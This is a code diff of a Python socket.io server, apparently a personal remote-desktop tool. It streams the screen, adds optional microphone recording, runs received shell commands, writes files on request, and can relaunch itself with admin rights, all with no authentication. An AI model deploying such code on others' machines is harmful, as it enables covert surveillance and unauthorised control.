@@ -10,7 +10,11 @@ import ctypes
 from PIL import Image
 import io
 import pyaudio
-import wave
+import numpy as np
+import threading
+import win32gui, win32ui
+import sounddevice as sd
+import soundfile as sf
 
 sio = socketio.AsyncServer(cors_allowed_origins='*')
 app = web.Application()
@@ -21,18 +25,21 @@ SOCKET_PORT = 4101
 working_dir = "."
 _capture_screen = bool(False)
 
-FORMAT = pyaudio.paInt16
-CHANNELS = 1  # mono audio
-RATE = 44100  # sampling rate
-CHUNK = 1024  # buffer size
-RECORD_SECONDS = 2  # duration of each audio capture
-DELAY_SECONDS = 0.075  # delay between iterations
+audio_on = False
+
+AUDIO_FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+DURATION = 1
 
 @sio.event
 async def connect(sid, environ):
+    global audio_on
     print('connect', sid)
-    get_admin()
+    # get_admin()
     await sio.emit('command_dir', os.path.abspath(working_dir))
+    audio_on = False
 
 @sio.event
 async def disconnect(sid):
@@ -40,41 +47,44 @@ async def disconnect(sid):
     await stop_stream()
     
 @sio.event
-async def start_stream(*_):
-    print("start_stream")
-    global _capture_screen
+async def start_stream(_, res):
+    global audio_on, _capture_screen
+    
+    print("start_stream with res:", res)
     _capture_screen = True
     # await capture_screen()
-    asyncio.create_task(capture_screen())
+    asyncio.create_task(capture_screen(res))
+    
+    if audio_on:
+        audio_thread = threading.Thread(target=asyncio.run, args=(stream_audio(),), daemon=True)
+        audio_thread.start()
+        # asyncio.create_task(stream_audio())
 
     
-async def capture_screen():
-    audio = pyaudio.PyAudio()
-    stream = audio.open(format=FORMAT,
-                        channels=CHANNELS,
-                        rate=RATE,
-                        input=True,
-                        input_device_index=0,
-                        frames_per_buffer=CHUNK)
-    
-    
+async def capture_screen(res):
     while _capture_screen:
         with mss.mss() as sct:
+            try:
+                res = int(res)
+            except:
+                print("res is not an int:", res)
+                
             sct.compression_level = 1
             monitor = sct.monitors[1]  # or a specific region
             sct_img = sct.grab(monitor)
+            sct_bytes = bytearray(sct_img.rgb)
+            try:
+                sct_img_mouse = add_mouse(sct_bytes, monitor['width'])
+            except:
+                sct_img_mouse = sct_bytes
+                pass
 
             # Convert the captured image to a PIL Image
-            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
+            img = Image.frombytes("RGB", sct_img.size, sct_img_mouse)
 
             # Resize the image
             width, height = img.size
-            if img.size == (1920, 1080):
-                img_resized = img.resize((width // 2, height // 2), Image.LANCZOS)
-            elif img.size == (3840, 2160):
-                img_resized = img.resize((width // 4, height // 4), Image.LANCZOS)
-            else:
-                img_resized = img.resize((width // 3, height // 3), Image.LANCZOS)
+            img_resized = img.resize((width // res, height // res), Image.LANCZOS)
 
             # Save as PNG and encode in base64
             with io.BytesIO() as output:
@@ -86,39 +96,37 @@ async def capture_screen():
             # Emit screen data
             await sio.emit('stream_data', png_data_encoded)
 
-        # Audio capture
-        frames = []
+            # Delay between iterations
+            await asyncio.sleep(0.1)
 
-        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-            data = stream.read(CHUNK)
-            frames.append(data)
 
-        with io.BytesIO() as output:
-            with wave.open(output, 'wb') as wf:
-                wf.setnchannels(CHANNELS)
-                wf.setsampwidth(audio.get_sample_size(FORMAT))
-                wf.setframerate(RATE)
-                wf.writeframes(b''.join(frames))
+async def stream_audio():
+    print("start audio")
+    while _capture_screen:
+        audio_data = sd.rec(int(RATE * DURATION), samplerate=RATE, channels=1, dtype=np.float32)
+        sd.wait()  # Wait for the recording to complete
 
-            wav_data = output.getvalue()
-            wav_data_encoded = base64.b64encode(wav_data).decode()
+        # Save the recorded audio to a WAV file and read the data
+        sf.write("temp.wav", audio_data, RATE)
+        with open("temp.wav", 'rb') as f:
+            audio_bytes = f.read()
 
-        # Emit audio data
-        await sio.emit('audio_data', wav_data_encoded)
-
-        # Delay between iterations
-        await asyncio.sleep(DELAY_SECONDS)
+        # Send the audio data to the server
+        await sio.emit('audio_data', audio_bytes)
+        await asyncio.sleep(0.05)
         
-    stream.stop_stream()
-    stream.close()
-    audio.terminate()
+    print("stop audio")
 
 @sio.event
 async def stop_stream(*_):
     global _capture_screen
     _capture_screen = False
     print("stop_screen")
-    
+
+@sio.event
+async def audio_toggle(*_):
+    global audio_on
+    audio_on = not audio_on
 
 @sio.event
 async def command_input(_, cmd_in):
@@ -134,7 +142,6 @@ async def command_input(_, cmd_in):
             
             # Change the working directory
             os.chdir(working_dir)
-            print(os.popen('cd').read().strip())
             await sio.emit('command_dir', os.popen('cd').read().strip())
             await sio.emit('command_output', os.popen('cd').read().strip())
         else:
@@ -162,6 +169,7 @@ def get_admin(*_):
 
     # Relaunch the script with admin privileges if needed
     def run_as_admin():
+        print(is_admin())
         if not is_admin():
             script = os.path.abspath(sys.argv[0])
             params = ' '.join([str(arg) for arg in sys.argv[1:]])
@@ -169,6 +177,68 @@ def get_admin(*_):
 
     # Run the script with admin permissions
     run_as_admin()
+    
+@sio.event
+async def create_file(_, data):
+    directory = data['directory']
+    file_name = data['fileName']
+    file_extension = data['fileExtension']
+    content = data['content']
+    # Ensure the directory exists, or create it
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+
+    # Combine the directory and file name to get the full file path
+    file_path = os.path.join(directory, f"{file_name}.{file_extension}")
+
+    # Create and write content to the file
+    with open(file_path, 'w') as file:
+        file.write(content)
+
+    print(f'created file: {directory}/{file_name}.{file_extension}\ncontent: {content}')
+
+
+def set_pixel(img, w, x, y, rgb=(0,0,0)):
+    """
+    Set a pixel in a, RGB byte array
+    """
+    pos = (x*w + y)*3
+    if pos>=len(img):return img # avoid setting pixel outside of frame
+    img[pos:pos+3] = rgb
+    return img
+
+def add_mouse(img, w):
+    flags, hcursor, (cx,cy) = win32gui.GetCursorInfo()
+    cursor = get_cursor(hcursor)
+    cursor_mean = cursor.mean(-1)
+    where = np.where(cursor_mean>0)
+    for x, y in zip(where[0], where[1]):
+        rgb = [x for x in cursor[x,y]]
+        img = set_pixel(img, w, x+cy, y+cx, rgb=rgb)
+    return img
+
+
+def get_cursor(hcursor):
+    info = win32gui.GetCursorInfo()
+    hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
+    hbmp = win32ui.CreateBitmap()
+    hbmp.CreateCompatibleBitmap(hdc, 36, 36)
+    hdc = hdc.CreateCompatibleDC()
+    hdc.SelectObject(hbmp)
+    hdc.DrawIcon((0,0), hcursor)
+    
+    bmpinfo = hbmp.GetInfo()
+    bmpbytes = hbmp.GetBitmapBits()
+    bmpstr = hbmp.GetBitmapBits(True)
+    im = np.array(Image.frombuffer(
+        'RGB',
+         (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
+         bmpstr, 'raw', 'BGRX', 0, 1))
+    
+    win32gui.DestroyIcon(hcursor)    
+    win32gui.DeleteObject(hbmp.GetHandle())
+    hdc.DeleteDC()
+    return im
 
 
 if __name__ == '__main__':
